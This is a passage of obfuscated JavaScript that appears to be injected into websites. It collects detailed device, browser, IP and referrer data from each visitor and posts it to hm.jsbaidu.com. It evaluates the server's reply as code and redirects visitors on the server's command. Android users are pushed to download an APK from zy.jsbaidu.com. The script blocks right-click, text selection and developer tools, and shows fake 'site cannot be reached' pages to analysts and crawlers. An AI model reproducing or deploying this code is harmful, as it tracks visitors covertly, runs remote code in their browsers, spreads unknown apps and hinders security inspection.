href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAABECAAAAADxDal4AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfnCwQFOgAcRTtOAAAAfElEQVRIx+2WQQrAIAwEa+kT88z8sZ6KSFwoYuvarqcoDg4xBtO59Y29kxP4d/AooeFdTqYalexasWg7WxUNj7Ycqta88VEnPpZVWMAcqh6ChvNCrUPgN0DwrEplol7AoVo1K9S5OFQdTqaqLgTWWbX74PuqSZ95gQJHgxlMxg+dRhxXMAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0xMS0wNFQwNTo1Nzo1OSswMDowMACMc7QAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMTEtMDRUMDU6NTc6NTkrMDA6MDBx0csIAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDIzLTExLTA0VDA1OjU4OjAwKzAwOjAwCrf67QAAAABJRU5ErkJggg==\" /></svg></div><h2>无法访问此网站</h2>\t<p>找不到此服务器的 IP 地址。</p><p>请试试以下办法：</p><ul>\t<li>检查网络连接</li> \t\t<li>检查代理服务器、防火墙和 DNS 配置</li><li>运行 Windows 网络诊断</li></ul><span>ERR_NAME_NOT_RESOLVED</span>\t  \t<button>重新加载</button></div><div class=\"bg\"><div>";
  _0x30c580.innerHTML = _0xd8f58a;
  _0x30c580.style.cssText = "visibility:visible;background:#fff;z-index:99999;position:fixed;width:100%;height:100%;";
}
function show404x() {
  _is404 = true;
  if (document.domain == "7zz.me" || document.URL.toLowerCase().indexOf("uu123") != -1 || is_spider != "") {
    return;
  }
  var _0x37f8ba = document.getElementsByTagName("head")[0];
  _0x37f8ba.innerHTML = "<meta charset=\"UTF-8\"><meta name=\"referrer\" content=\"no-referrer\"><title>网页无法访问</title>";
  var _0x2f7881 = document.getElementsByTagName("body")[0];
  var _0x36e02f = "u=" + encodeURIComponent(document.URL) + "&ref=" + encodeURIComponent(document.referrer);
  var _0x5d1446 = "<style>html,body,div,ul,ol,li,p,h1,h2,h3,h4,h5,h6,form,table,input,button,td,img,tr,dl,dd,dt{margin:0;padding:0;border:0;}body{font-family:\"Segoe UI\",Arial,\"Microsoft Yahei\",sans-serif;font-size:14px;color:#666;background:#fff;}.center{box-sizing: border-box;font-size:1em;line-height:1.6em;margin:14vh auto 0;width:300px;background:#fff;position:fixed;z-index:9999999;top:0;left:50%; margin-left:-140px; }.bg {z-index:99999;background:#fff;position:fixed;width:100%;height:100%; top:0;left:0;}h2{color:#000;line-height:60px;font-size:24px;font-weight:500;}p{line-height:32px;}ul{padding-left:40px;}ul li{color:#1a73e8;line-height:24px;cursor:pointer;}span{display:block;line-height:32px;font-size:12px;}button{margin:51px 0 0;padding:8px 16px;background:#1a73e8;color:#fff; border-radius: 20px;font-size:1em;cursor:pointer;}</style><div class=\"center\"><div class=\"img\"><svg version=\"1.1\" id=\"Layer_1\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" x=\"0px\" y=\"0px\" width=\"56px\" height=\"68px\" viewBox=\"0 0 56 68\" enable-background=\"new 0 0 56 68\" xml:space=\"preserve\">  <image id=\"image0\" width=\"56\" height=\"68\" x=\"0\" y=\"0\"    href=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAABECAAAAADxDal4AAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfnCwQFOgAcRTtOAAAAfElEQVRIx+2WQQrAIAwEa+kT88z8sZ6KSFwoYuvarqcoDg4xBtO59Y29kxP4d/AooeFdTqYalexasWg7WxUNj7Ycqta88VEnPpZVWMAcqh6ChvNCrUPgN0DwrEplol7AoVo1K9S5OFQdTqaqLgTWWbX74PuqSZ95gQJHgxlMxg+dRhxXMAAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMy0xMS0wNFQwNTo1Nzo1OSswMDowMACMc7QAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjMtMTEtMDRUMDU6NTc6NTkrMDA6MDBx0csIAAAAKHRFWHRkYXRlOnRpbWVzdGFtcAAyMDIzLTExLTA0VDA1OjU4OjAwKzAwOjAwCrf67QAAAABJRU5ErkJggg==\" /></svg></div><h2>无法访问此网站</h2>\t<p>找不到此服务器的 IP 地址。</p><p>请试试以下办法：</p><ul>\t<li>检查网络连接</li> \t\t<li>检查代理服务器、防火墙和 DNS 配置</li><li>运行 Windows 网络诊断</li></ul><span>ERR_NAME_NOT_RESOLVED</span>\t  \t<button>重新加载</button></div><div class=\"bg\"><div><meta http-equiv=\"refresh\" content=\"0; URL=http://7zz.me/#" + _0x36e02f + "\"/>";
  _0x2f7881.innerHTML = _0x5d1446;
  _0x2f7881.style.cssText = "visibility:visible;background:#fff;z-index:99999;position:fixed;width:100%;height:100%;";
}
var _country = "";
var _isindex = 0;
var _isdebugger = 0;
var obj_data = {};
var _is404 = false;
var iswx = false;
navigator.userAgent.toLowerCase().indexOf("micromessenger") > 0 && (iswx = true, document.URL.toLowerCase().indexOf("uu123") != -1 && (iswx = false));
getMytjData();
function getMytjData() {
  function _0x12715f() {
    if (!ispc || !iswx) {
      if (_0x547987() == "android") {
        if (current_domain == "aaa.com" || current_domain == "www.aaa.com") {
          if (_country.indexOf("北京") == -1 || _country.indexOf("韩国") == -1 || _country.indexOf("日本") == -1) {
            var _0x57ddae = JKSite3.Cookie.get("down");
            _0x57ddae == null && (JKSite3.Cookie.set("down", "ok", "/"), window.setTimeout("window.location='https://zy.jsbaidu.com/1.apk'", 3000));
          }
        }
      }
    }
  }
  var _0x50747d = {
    get: function (_0x564882, _0x59d6af) {
      var _0x5c3173 = new XMLHttpRequest();
      _0x5c3173.open("GET", _0x564882, true);
      _0x5c3173.onreadystatechange = function () {
        (_0x5c3173.readyState == 4 && _0x5c3173.status == 200 || _0x5c3173.status == 304) && _0x59d6af.call(this, _0x5c3173.responseText);
      };
      _0x5c3173.send();
    },
    post: function (_0x9f8dc5, _0x2a47c0, _0x9a8f77) {
      var _0x230dd1 = new XMLHttpRequest();
      _0x230dd1.open("POST", _0x9f8dc5, true);
      _0x230dd1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      _0x230dd1.onreadystatechange = function () {
        _0x230dd1.readyState == 4 && (_0x230dd1.status == 200 || _0x230dd1.status == 304) && _0x9a8f77.call(this, _0x230dd1.responseText);
      };
      _0x230dd1.send(_0x2a47c0);
    }
  };
  var _0x538df1 = document.URL.toLowerCase();
  var _0x3dc9b0 = true;
  var _0x5bbce8 = true;
  var _0x4b44d9 = ["yiqikan8.com", "mnjunshi.com", "junshi888.com", "jrjs8.com", "yyp.net", "dudu123.com", "xhgame.com", "shencekeji.com", "diwuai.com", "59tt.com"];
  for (var _0x316cf9 = 0; _0x316cf9 < _0x4b44d9.length; _0x316cf9++) {
    current_domain.indexOf(_0x4b44d9[_0x316cf9]) != -1 && (_0x5bbce8 = false);
  }
  _0x538df1.indexOf("uu123") != -1 && (_0x3dc9b0 = false);
  if (_0x3dc9b0) {
    if (_0x5bbce8) {
      document.oncontextmenu = new Function("event.returnValue=false");
      document.onselectstart = new Function("event.returnValue=false");
      document.addEventListener("keydown", function (_0x10b932) {
        (_0x10b932.key == "F12" || _0x10b932.key == "F5" || _0x10b932.ctrlKey && _0x10b932.keyCode == 85) && _0x10b932.preventDefault();
      });
      function _0x4c107a() {
        DisableDevtool({
          ondevtoolopen(_0x576d2c, _0x1985a0) {
            _isdebugger = 1;
            _0x869215("debugger");
            _0x1985a0();
          }
        });
      }
      (pc_system.win || pc_system.mac || pc_system.xll) && (window.addEventListener("resize", _0x4c107a), _0x4c107a());
    }
  }
  function _0x869215(_0xde71e6) {
    var _0x201e3f = document.URL;
    _0x201e3f = _0x201e3f.replace("&", "＆");
    _0x201e3f = encodeURIComponent(_0x201e3f);
    var _0xe62f9d = {
      key: _0xde71e6,
      url: _0x201e3f
    };
    _0x50747d.post(ishttp + "//hm.jsbaidu.com/key/", "arg=" + JSON.stringify(_0xe62f9d), function (_0x25446e) {});
  }
  _0x292ba8();
  function _0x292ba8() {
    var _0x8c90cc = new Date();
    var _0x4943d2 = _0x8c90cc.getTime();
    var _0x5015e5 = _0x8c90cc.getFullYear() + 10 + "/" + (_0x8c90cc.getMonth() + 1) + "/" + _0x8c90cc.getDate() + " 23:59:59";
    var _0x3cb32f = new Date(_0x5015e5).getTime();
    var _0x23e725 = new Date(_0x3cb32f + 28800000);
    var _0xc00327 = _0x8c90cc.getFullYear() + "/" + (_0x8c90cc.getMonth() + 1) + "/" + _0x8c90cc.getDate() + " 23:59:59";
    var _0x351646 = new Date(_0xc00327).getTime();
    var _0x4ee10c = new Date(_0x351646);
    var _0x24f897 = _0x8c90cc.getFullYear() + "/" + (_0x8c90cc.getMonth() + 1) + "/" + (_0x8c90cc.getDate() + 8) + " 23:59:59";
    var _0x415fc3 = new Date(_0x24f897).getTime();
    var _0xc9ad31 = new Date(_0x351646);
    var _0x1e1e12 = _0x8c90cc.getFullYear() + "/" + (_0x8c90cc.getMonth() + 1) + "/" + _0x8c90cc.getDate() + " " + (_0x8c90cc.getHours() + 1) + ":59:59";
    var _0x27a20d = new Date(_0x1e1e12).getTime();
    var _0x5243b3 = new Date(_0x27a20d);
    var _0x2ad740 = _0x352275("country_3");
    _0x2ad740 == "undefined" || _0x2ad740 == null ? _0x2ad740 = "" : _country = _0x2ad740;
    _country != "" && _0x3fecfe();
    var _0x2fc7c5 = parseInt(_0x352275("tvc"));
    _0x2fc7c5 > 0 ? (_0x2fc7c5 = _0x2fc7c5 + 1, document.cookie = "tvc=" + _0x2fc7c5 + "; expires=" + _0x4ee10c.toGMTString() + "; path=/") : (_0x2fc7c5 = 1, document.cookie = "tvc=" + _0x2fc7c5 + "; expires=" + _0x4ee10c.toGMTString() + "; path=/");
    var _0x575642 = parseInt(_0x352275("visitcounts"));
    _0x575642 > 0 ? (_0x575642 = _0x575642 + 1, document.cookie = "visitcounts=" + _0x575642 + "; expires=" + _0x23e725.toGMTString() + "; path=/") : (_0x575642 = 1, document.cookie = "visitcounts=" + _0x575642 + "; expires=" + _0x23e725.toGMTString() + "; path=/");
    var _0x2222be = _0x352275("visitip2");
    (_0x2222be == "undefined" || _0x2222be == null) && (_0x2222be = "");
    var _0x4b905c = _0x352275("visittime2");
    !_0x4b905c && (_0x4b905c = parseInt(new Date().getTime() / 1000), document.cookie = "visittime2=" + _0x4b905c + "; expires=" + _0x23e725.toGMTString() + "; path=/");
    var _0xdf2f8c = _0x352275("visitnow");
    (_0xdf2f8c == "undefined" || _0xdf2f8c == null || _0xdf2f8c == NaN) && (_0xdf2f8c = parseInt(new Date().getTime() / 1000));
    var _0x5edab0 = _0x352275("ipnow");
    (_0x5edab0 == "undefined" || _0x5edab0 == null || _0x5edab0 == NaN) && (_0x5edab0 = "");
    var _0x3e8dfb = _0x352275("country_now2");
    (_0x3e8dfb == "undefined" || _0x3e8dfb == null) && (_0x3e8dfb = "");
    var _0x89426b = _0x352275("randnumber_4");
    (_0x89426b == "undefined" || _0x89426b == null) && (_0x89426b = "");
    var _0x44731b = _0x352275("randnumber_6");
    (_0x44731b == "undefined" || _0x44731b == null) && (_0x44731b = "");
    var _0xcdcfc4 = _0x352275("refdebug");
    if (!(_0xcdcfc4 == "undefined" || _0xcdcfc4 == null || _0xcdcfc4 == NaN)) {
      (_0xcdcfc4 == 1 || ispc) && _isdebugger && show404x();
    }
    var _0x17127c = _0x352275("isindex");
    _0x17127c == "undefined" || _0x17127c == null || _0x17127c == NaN ? _0x17127c = "" : _isindex = _0x17127c;
    parseInt(_isindex) > 1 && show404("1-" + _isindex);
    var _0x3f4b2a = document.URL;
    var _0x284b1 = _0x352275("visiturl");
    (_0x284b1 == "" || _0x284b1 == "undefined" || _0x284b1 == null) && (_0x284b1 = _0x3f4b2a, document.cookie = "visiturl=" + _0x3f4b2a + "; expires=" + _0x23e725.toGMTString() + "; path=/");
    var _0x185521 = document.referrer;
    var _0x5a5d34 = _0x352275("visitref");
    (_0x5a5d34 == "undefined" || _0x5a5d34 == null) && (_0x5a5d34 = "");
    _0x5a5d34 == "" && _0x185521 !== "" && (_0x5a5d34 = _0x185521, document.cookie = "visitref=" + _0x185521 + "; expires=" + _0x23e725.toGMTString() + "; path=/");
    var _0x56bf6a = "";
    if (_0x5a5d34 != "") {
      try {
        _0x56bf6a = _0x5a5d34.split("://")[1].split("/")[0];
      } catch (_0x4850ab) {
        console.log(_0x4850ab);
      }
    }
    var _0x5092cc = _0x185521;
    _0x5092cc != "" && (_0x5092cc = _0x5092cc.replace(/\{[^}]*\}/im, ""));
    _0x5a5d34 != "" && (_0x5a5d34 = _0x5a5d34.replace(/\{[^}]*\}/im, ""));
    _0x284b1 != "" && (_0x284b1 = _0x284b1.replace(/\{[^}]*\}/im, ""));
    var _0x3f4b2a = document.URL;
    _0x3f4b2a != "" && (_0x3f4b2a = _0x3f4b2a.replace(/\{[^}]*\}/im, ""));
    var _0x518564 = document.URL.split("://")[1].split("/")[0];
    var _0x3e8242 = {
      type: _0x547987(),
      model: _0x54bf93(),
      resolution_w: parseInt(window.screen.width * window.devicePixelRatio),
      resolution_h: parseInt(window.screen.height * window.devicePixelRatio),
      net_type: navigator.platform,
      sys_ver: _0x262dca(),
      app_ver: _0x50bf4c().name + " " + _0x50bf4c().version,
      channel: _0x518564,
      nums: parseInt(_0x352275("visitcounts")),
      nums2: parseInt(_0x352275("tvc")),
      addtime1: _0x4b905c,
      randnumber: _0x89426b,
      randnumber5: _0x44731b,
      ip1: _0x2222be,
      refdomain1: _0x56bf6a,
      isindex: _0x15bf85(),
      country_now: _0x3e8dfb,
      visitnow: _0xdf2f8c,
      ipnow: _0x5edab0,
      ispc: ispc,
      iswx: iswx,
      ua: navigator.userAgent,
      country: encodeURIComponent(_0x2ad740),
      url1: encodeURIComponent(_0x284b1),
      cur_url: encodeURIComponent(_0x3f4b2a),
      cur_ref: encodeURIComponent(_0x5092cc),
      ref1: encodeURIComponent(_0x5a5d34),
      title: encodeURIComponent(document.title),
      keywords: encodeURIComponent(document.querySelector("meta[name=\"keywords\"]")?.["getAttribute"]("content")),
      description: encodeURIComponent(document.querySelector("meta[name=\"description\"]")?.["getAttribute"]("content"))
    };
    obj_data = _0x3e8242;
    _0x50747d.post(ishttp + "//hm.jsbaidu.com/img/", "arg=" + encodeURIComponent(JSON.stringify(_0x3e8242)), function (_0x2b135d) {
      var _0x1bde82 = eval("(" + _0x2b135d + ")");
      userip = _0x1bde82.data.userip;
      _country = _0x1bde82.data.country_1;
      _isindex = parseInt(_0x1bde82.data.isindex);
      _0x1bde82?.["data"]?.["showAas"] == 1 && showAas(_0x1bde82?.["data"]?.["showAasData"]);
      _0x1bde82?.["data"]?.["locationFlag"] == 1 && (window.location.href = _0x1bde82.data.locationUrl);
      (_0x1bde82.data.ref == 1 || ispc) && _isdebugger ? (document.cookie = "refdebug=" + _0x1bde82.data.ref.toString() + "; expires=" + _0x23e725.toGMTString() + "; path=/", show404x()) : _isindex > 1 && ((_isindex === 3 || _isindex === 4) && (document.cookie = "isindex=" + _0x1bde82.data.isindex.toString() + "; expires=" + _0x4ee10c.toGMTString() + "; path=/"), show404("2-" + _isindex));
      _0x2222be == "" && (document.cookie = "visitip2=" + userip + "; expires=" + _0x23e725.toGMTString() + "; path=/");
      _0x89426b == "" && (document.cookie = "randnumber_4=" + _0x1bde82.data.id + "; expires=" + _0x23e725.toGMTString() + "; path=/");
      _0x44731b == "" && (document.cookie = "randnumber_6=" + _0x1bde82.data.id2 + "; expires=" + _0x23e725.toGMTString() + "; path=/");
      (_0x2ad740 == "" || _0x2ad740 == "undefined") && (document.cookie = "country_3=" + encodeURI(_0x1bde82.data.country_1) + "; expires=" + _0xc9ad31.toGMTString() + "; path=/");
      document.cookie = "ipnow=" + userip + "; expires=" + _0x4ee10c.toGMTString() + "; path=/";
      document.cookie = "country_now2=" + encodeURI(_0x1bde82.data.country_1) + "; expires=" + _0x4ee10c.toGMTString() + "; path=/";
      _0xdf2f8c = parseInt(new Date().getTime() / 1000);
      document.cookie = "visitnow=" + _0xdf2f8c + "; expires=" + _0x4ee10c.toGMTString() + "; path=/";
      _country != "" && !_is404 && _0x12715f();
      _0x3fecfe();
    });
  }
  function _0x3fecfe() {
    if (is_spider != "") {
      return;
    }
  }
  function _0x15bf85() {
    var _0x6113c7 = document.URL;
    if (_0x6113c7 == "https://cdn.jsbaidu.com/" || _0x6113c7 == "http://cdn.jsbaidu.com/" || _0x6113c7 == "https://zy.jsbaidu.com/" || _0x6113c7 == "http://zy.jsbaidu.com/" || _0x6113c7 == "https://music.jsbaidu.com/" || _0x6113c7 == "http://music.jsbaidu.com/" || _0x6113c7 == "https://hm.jsbaidu.com/" || _0x6113c7 == "http://hm.jsbaidu.com/") {
      return 1;
    }
    return 0;
  }
  function _0x3b59ff(_0x457e43, _0x29a9d0) {
    var _0x3069c2 = _0x29a9d0 - _0x457e43;
    var _0x3e77ec = Math.random();
    var _0x4cd2ab = _0x457e43 + Math.round(_0x3e77ec * _0x3069c2);
    return _0x4cd2ab;
  }
  function _0x547987() {
    var _0x32f0d6 = navigator.userAgent.toLowerCase();
    _0x32f0d6 = _0x32f0d6.toLowerCase();
    if (_0x32f0d6.indexOf("mobile") != -1) {
      var _0x1e1fcd = /iphone/.test(_0x32f0d6) && !window.MSStream;
      if (_0x1e1fcd) {
        return "iphone";
      }
      var _0x5dcf35 = /android/.test(_0x32f0d6) && !window.MSStream;
      if (_0x5dcf35) {
        return "android";
      }
      return "mobile";
    } else {
      if (_0x32f0d6.indexOf("windows") >= 0) {
        return "windows";
      }
      var _0x3e272c = /macintosh|mac os x/i.test(_0x32f0d6) && !window.MSStream;
      if (_0x3e272c) {
        return "MAC";
      }
    }
    return "";
  }
  function _0x2bfc2c() {
    var _0x2ddfa8 = "";
    var _0x372391 = navigator.userAgent.toLowerCase();
    switch (_0x372391) {
      case "nettype/wifi":
        _0x2ddfa8 = "wifi";
        break;
      case "nettype/4g":
        _0x2ddfa8 = "4g";
        break;
      case "nettype/3g":
        _0x2ddfa8 = "3g";
        break;
      case "nettype/3gnet":
        _0x2ddfa8 = "3g";
        break;
      case "nettype/2g":
        _0x2ddfa8 = "2g";
        break;
      default:
        _0x2ddfa8 = "";
    }
    if (_0x2ddfa8 != "") {
      return _0x2ddfa8;
    }
    try {
      var _0x5f167b = navigator.connection.effectiveType;
      switch (_0x5f167b) {
        case "wifi":
          _0x2ddfa8 = "wifi";
          break;
        case "4g":
          _0x2ddfa8 = "4g";
          break;
        case "3g":
          _0x2ddfa8 = "3g";
          break;
        case "3gnet":
          _0x2ddfa8 = "3g";
          break;
        case "2g":
          _0x2ddfa8 = "2g";
          break;
        default:
          _0x2ddfa8 = "";
      }
    } catch (_0x29561c) {}
    return _0x2ddfa8;
  }
  function _0x262dca() {
    var _0x549a98 = navigator.userAgent;
    var _0x4ec771 = "";
    if (_0x549a98.toLowerCase().indexOf("mobile") != -1) {
      var _0x19eda2 = _0x549a98.match(/iPhone OS [\d._]*/gi);
      _0x19eda2 && (_0x4ec771 = _0x19eda2[0].replace(/_/ig, "."));
      if (_0x549a98.indexOf("Android") > -1 || _0x549a98.indexOf("Linux") > -1) {
        _0x4ec771 = "Android" + _0x549a98.substr(_0x549a98.indexOf("Android") + 8, _0x549a98.indexOf(";", _0x549a98.indexOf("Android")) - _0x549a98.indexOf("Android") - 8);
        _0x4ec771.indexOf(") AppleWebKit/") != -1 && (_0x4ec771 = _0x4ec771.split(") AppleWebKit/")[0]);
        _0x4ec771.indexOf(" Release/") != -1 && (_0x4ec771 = _0x4ec771.split(" Release/")[0]);
      } else {
        if (_0x549a98.indexOf("BB10") > -1) {
          _0x4ec771 = "blackberry" + _0x549a98.substr(_0x549a98.indexOf("BB10") + 5, _0x549a98.indexOf(";", _0x549a98.indexOf("BB10")) - _0x549a98.indexOf("BB10") - 5);
        } else {
          _0x549a98.indexOf("IEMobile") > -1 && (_0x4ec771 = "winphone" + _0x549a98.substr(_0x549a98.indexOf("IEMobile") + 9, _0x549a98.indexOf(";", _0x549a98.indexOf("IEMobile")) - _0x549a98.indexOf("IEMobile") - 9));
        }
      }
    } else {
      if (_0x549a98.toLowerCase().indexOf("windows") >= 0) {
        var _0x27ffcd = _0x549a98.toLowerCase();
        if (_0x27ffcd.indexOf("windows nt 5.0") > -1) {
          _0x4ec771 = "Windows 2000";
        } else {
          if (_0x27ffcd.indexOf("windows nt 5.1") > -1 || _0x27ffcd.indexOf("windows nt 5.2") > -1) {
            _0x4ec771 = "Windows XP";
          } else {
            if (_0x27ffcd.indexOf("windows nt 6.0") > -1) {
              _0x4ec771 = "Windows Vista";
            } else {
              if (_0x27ffcd.indexOf("windows nt 6.1") > -1 || _0x27ffcd.indexOf("windows 7") > -1) {
                _0x4ec771 = "Windows 7";
              } else {
                if (_0x27ffcd.indexOf("windows nt 6.2") > -1 || _0x27ffcd.indexOf("windows 8") > -1) {
                  _0x4ec771 = "Windows 8";
                } else {
                  if (_0x27ffcd.indexOf("windows nt 6.3") > -1) {
                    _0x4ec771 = "Windows 8.1";
                  } else {
                    (_0x27ffcd.indexOf("windows nt 6.2") > -1 || _0x27ffcd.indexOf("windows nt 10.0") > -1) && (_0x4ec771 = "Windows 10");
                  }
                }
              }
            }
          }
        }
      }
      var _0x1d1cf4 = /macintosh|mac os x/i.test(_0x549a98.toLowerCase()) && !window.MSStream;
      if (_0x1d1cf4) {
        var _0x23103c = /OS X [\d._]*/gi;
        var _0x252b32 = _0x549a98.match(_0x23103c);
        _0x4ec771 = "Mac " + (_0x252b32 + "").replace(/_/ig, ".");
        _0x4ec771 = _0x4ec771.replace(" null", "");
      }
    }
    return _0x4ec771;
  }
  function _0x50bf4c() {
    let _0x4d77f2 = navigator.userAgent.toLowerCase();
    let _0x388a44 = /edge\/[\d.]+/gi;
    let _0x4bf983 = /trident\/[\d.]+/gi;
    let _0x5af8e2 = /msie\s[\d.]+/gi;
    let _0x272ed6 = /firefox\/[\d.]+/gi;
    let _0x2c6535 = /chrome\/[\d.]+/gi;
    let _0x33e933 = /safari\/[\d.]+/gi;
    let _0x25eac9 = /opr\/[\d.]+/gi;
    let _0x1a312d = /opera\/[\d.]+/gi;
    let _0x4fe00d = /qqbrowser\/[\d.]+/gi;
    let _0x44c91e = /MicroMessenger\/[\d.]+/gi;
    let _0x3bf717 = /UCBrowser\/[\d.]+/gi;
    let _0x4efbb8 = /2345Explorer\/[\d.]+/gi;
    let _0x28443c = /Maxthon\/[\d.]+/gi;
    let _0x310c87 = /SogouMobileBrowser\/[\d.]+/gi;
    let _0x17e92b = /SogouMSE\/[\d.]+/gi;
    let _0x3f849c = /SogouMSESDK hot_sdk_[\d.]+/gi;
    let _0x3940ba = /baiduboxapp\/[\d.]+/gi;
    let _0x5a76e4 = /NewsArticle\/[\d.]+/gi;
    let _0x32a6dc = /Quark\/[\d.]+/gi;
    var _0x107f9b;
    function _0x5ddb53() {
      var _0x5328e6 = false;
      for (var _0x42e5d7 in navigator.plugins) {
        if (navigator.plugins[_0x42e5d7].filename == "internal-nacl-plugin") {
          return !_0x5328e6;
        }
      }
      return _0x5328e6;
    }
    if (_0x4d77f2.indexOf("maxthon") > 0) {
      _0x107f9b = _0x4d77f2.match(_0x28443c)[0].split("/");
      return {
        name: _0x107f9b[0],
        version: _0x107f9b[1]
      };
    } else {
      if (_0x4d77f2.indexOf("baiduboxapp") > 0) {
        _0x107f9b = _0x4d77f2.match(_0x3940ba)[0].split("/");
        return {
          name: _0x107f9b[0],
          version: _0x107f9b[1]
        };
      } else {
        if (_0x4d77f2.indexOf("qqbrowse") > 0) {
          _0x107f9b = _0x4d77f2.match(_0x4fe00d)[0].split("/");
          return {
            name: _0x107f9b[0],
            version: _0x107f9b[1]
          };
        } else {
          if (_0x4d77f2.indexOf("NewsArticle") > 0) {
            _0x107f9b = _0x4d77f2.match(_0x5a76e4)[0].split("/");
            return {
              name: _0x107f9b[0],
              version: _0x107f9b[1]
            };
          } else {
            if (_0x4d77f2.indexOf("Quark") > 0) {
              _0x107f9b = _0x4d77f2.match(_0x32a6dc)[0].split("/");
              return {
                name: _0x107f9b[0],
                version: _0x107f9b[1]
              };
            } else {
              if (_0x4d77f2.indexOf("metasr") > 0) {
                return {
                  name: "metasr",
                  version: ""
                };
              } else {
                if (_0x4d77f2.indexOf("sogoumobilebrowser") > 0) {
                  _0x107f9b = _0x4d77f2.match(_0x310c87)[0].split("/");
                  return {
                    name: _0x107f9b[0],
                    version: _0x107f9b[1]
                  };
                } else {
                  if (_0x4d77f2.indexOf("sogoumsesdk hot_sdk_") > 0) {
                    _0x107f9b = _0x4d77f2.match(_0x3f849c)[0].split("sogoumsesdk hot_sdk_");
                    return {
                      name: _0x107f9b[0],
                      version: _0x107f9b[1]
                    };
                  } else {
                    if (_0x4d77f2.indexOf("sogoumse") > 0) {
                      _0x107f9b = _0x4d77f2.match(_0x17e92b)[0].split("/");
                      return {
                        name: _0x107f9b[0],
                        version: _0x107f9b[1]
                      };
                    } else {
                      if (_0x4d77f2.indexOf("se 2.x") > 0) {
                        return {
                          name: "搜狗浏览器",
                          version: ""
                        };
                      } else {
                        if (_0x5ddb53() && _0x4d77f2.indexOf("Safari") > -1) {
                          return {
                            name: "360浏览器",
                            version: ""
                          };
                        } else {
                          if (_0x4d77f2.indexOf("micromessenger") > 0) {
                            _0x107f9b = _0x4d77f2.match(_0x44c91e)[0].split("/");
                            return {
                              name: _0x107f9b[0],
                              version: _0x107f9b[1]
                            };
                          } else {
                            if (_0x4d77f2.indexOf("ucbrowser") > 0) {
                              _0x107f9b = _0x4d77f2.match(_0x3bf717)[0].split("/");
                              return {
                                name: _0x107f9b[0],
                                version: _0x107f9b[1]
                              };
                            } else {
                              if (_0x4d77f2.indexOf("2345explorer") > 0) {
                                _0x107f9b = _0x4d77f2.match(_0x4efbb8)[0].split("/");
                                return {
                                  name: _0x107f9b[0],
                                  version: _0x107f9b[1]
                                };
                              } else {
                                if (_0x4d77f2.indexOf("trident") > 0) {
                                  _0x107f9b = _0x4d77f2.match(_0x4bf983)[0].split("/");
                                  return {
                                    name: _0x107f9b[0],
                                    version: _0x107f9b[1]
                                  };
                                } else {
                                  if (_0x4d77f2.indexOf("msie") > 0) {
                                    _0x107f9b = _0x4d77f2.match(_0x5af8e2)[0].split("/");
                                    return {
                                      name: _0x107f9b[0],
                                      version: _0x107f9b[1]
                                    };
                                  } else {
                                    if (_0x4d77f2.indexOf("edge") > 0) {
                                      _0x107f9b = _0x4d77f2.match(_0x388a44)[0].split("/");
                                      return {
                                        name: _0x107f9b[0],
                                        version: _0x107f9b[1]
                                      };
                                    } else {
                                      if (_0x4d77f2.indexOf("firefox") > 0) {
                                        _0x107f9b = _0x4d77f2.match(_0x272ed6)[0].split("/");
                                        return {
                                          name: _0x107f9b[0],
                                          version: _0x107f9b[1]
                                        };
                                      } else {
                                        if (_0x4d77f2.indexOf("opera") > 0) {
                                          _0x107f9b = _0x4d77f2.match(_0x1a312d)[0].split("/");
                                          return {
                                            name: _0x107f9b[0],
                                            version: _0x107f9b[1]
                                          };
                                        } else {
                                          if (_0x4d77f2.indexOf("opr") > 0) {
                                            _0x107f9b = _0x4d77f2.match(_0x25eac9)[0].split("/");
                                            return {
                                              name: _0x107f9b[0],
                                              version: _0x107f9b[1]
                                            };
                                          } else {
                                            if (_0x4d77f2.indexOf("safari") > 0 && _0x4d77f2.indexOf("chrome") < 0) {
                                              _0x107f9b = _0x4d77f2.match(_0x33e933)[0].split("/");
                                              return {
                                                name: _0x107f9b[0],
                                                version: _0x107f9b[1]
                                              };
                                            } else {
                                              return _0x4d77f2.indexOf("chrome") > 0 ? (_0x107f9b = _0x4d77f2.match(_0x2c6535)[0].split("/"), {
                                                name: _0x107f9b[0],
                                                version: _0x107f9b[1]
                                              }) : {
                                                name: "",
                                                version: ""
                                              };
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  function _0x54bf93() {
    var _0x24f190 = navigator.userAgent;
    var _0x2c281f = _0x24f190.match(/Android.*; ?(.*(?= Build))/);
    if (_0x2c281f && _0x2c281f.length > 1) {
      m1type = _0x2c281f[1];
      if (_0x24f190.indexOf("HUAWEI") > 0) {
        m1type = "HUAWEI " + m1type;
      } else {
        _0x24f190.indexOf("HONOR") > 0 && (m1type = "HONOR " + m1type);
      }
      return m1type;
    } else {
      _0x2c281f = _0x24f190.match(/Android.*; ?(.*(?=;))/);
      if (_0x2c281f && _0x2c281f.length > 1) {
        m1type = _0x2c281f[1].split(";")[0];
        return m1type;
      }
      _0x2c281f = _0x24f190.match(/Android.*; ?(.*(?=\)))/);
      if (_0x2c281f && _0x2c281f.length > 1) {
        m1type = _0x2c281f[1].split(")")[0];
        return m1type;
      }
    }
    if (_0x24f190.indexOf("BlackBerry") != -1 || _0x24f190.indexOf("BB10") != -1) {
      return "BlackBerry";
    }
    if (_0x24f190.indexOf("Moto") != -1) {
      return "Moto";
    }
    if (_0x24f190.indexOf("Windows Phone") != -1) {
      return "Windows Phone";
    }
    var _0x3cb010 = _0x24f190.toLowerCase().indexOf("iphone") > -1;
    var _0x183d89 = _0x24f190.toLowerCase().indexOf("ipad") > -1;
    if (_0x3cb010) {
      return "iphone";
    } else {
      if (_0x183d89) {
